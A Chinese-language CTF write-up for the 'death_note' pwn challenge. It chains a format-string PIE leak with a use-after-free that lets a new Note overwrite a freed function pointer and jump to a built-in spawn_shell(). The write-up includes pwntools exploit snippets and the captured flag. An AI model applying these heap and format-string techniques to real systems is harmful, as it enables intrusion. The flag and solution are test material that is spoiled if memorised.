# death_note

## 题目简述

程序维护一个含标题指针和函数指针的 `CoverPage`，以及最多十个 17 字节的 `Note`。目标为 x86-64 PIE、NX 开启、无 Canary。`erase_cover()` 释放 `cover` 却不置空，形成 UAF；`check_name()` 又把用户输入直接传给 `printf`，形成格式化字符串泄露。两个漏洞组合后，可以先恢复 PIE 基址，再让新 `Note` 复用旧 cover 堆块并覆盖函数指针，跳转到内置 `spawn_shell()`。

## 解题过程

### 释放后悬空的 cover

`CoverPage` 在 64 位下为 16 字节：

```c
typedef struct CoverPage {
    char *title;
    void (*print)(struct CoverPage *);
} CoverPage;
```

但初始化时使用 `malloc(sizeof(Note))`，即申请 17 字节；它和后续 `malloc(sizeof(Note))` 仍会落入同一 glibc 小块大小类。删除函数释放标题和 cover 后没有执行 `cover = NULL`：

```c
free(cover->title);
free(cover);
// cover 仍为悬空指针
```

### 格式化字符串泄露 PIE

在申请新 Note 前，先调用 `check_name()`。其中的 `printf(buf)` 可用 `%25$p` 读取栈上的代码返回地址：

```python
io.sendlineafter(b"> ", b"4")
io.sendlineafter(b"> ", b"%25$p")
io.recvuntil(b"Checking name : ")
return_address = int(io.recvline().strip(), 16)
```

官方构建中该值对应 `main+336`。于是

$$
\text{spawn\_shell}_{runtime}
=\text{leak}-\bigl((\text{main}+336)-\text{spawn\_shell}\bigr).
$$

用 ELF 符号写成：

```python
delta = elf.sym["main"] + 336 - elf.sym["spawn_shell"]
spawn_shell = return_address - delta
```

### 复用堆块并覆盖函数指针

随后添加第一个 Note。同大小类使它优先复用刚释放的 cover 块。`Note.name` 最多可接收 16 个非换行字节，正好覆盖旧 `CoverPage` 的两个 8 字节字段：

```python
io.sendlineafter(b"> ", b"2")  # erase cover

# 完成上面的格式化字符串泄露后：
io.sendlineafter(b"> ", b"3")
payload = b"A" * 8 + p64(spawn_shell)
io.sendlineafter(b"Enter name: ", payload)
```

此时悬空的 `cover` 与 `notes[0]` 指向同一块内存；前 8 字节被当成 `title`，后 8 字节被当成 `print`。选择“Print cover”会执行：

```c
cover->print(cover);
```

控制流因此进入 `spawn_shell()`。该函数忽略参数并调用 `system("/bin/sh")`，所以无效的伪标题指针不会被解引用。取得 shell 后读取：

```text
shellmates{lIGht_yaG4MI_1s_proud_0f_y0uUUUUu}
```

## 方法总结

- 核心技巧：格式化字符串泄露 PIE 基址，再用同大小类堆块复用把 UAF 转成函数指针劫持。
- 识别信号：释放全局对象后未清空指针、后续存在相近大小的可控分配，并且对象内含回调指针时，应优先检查类型混淆式 UAF。
- 复用要点：格式化字符串参数序号和泄露返回点依赖编译结果；先在目标构建中确认 `%25$p` 对应位置，再按符号差计算运行时函数地址。
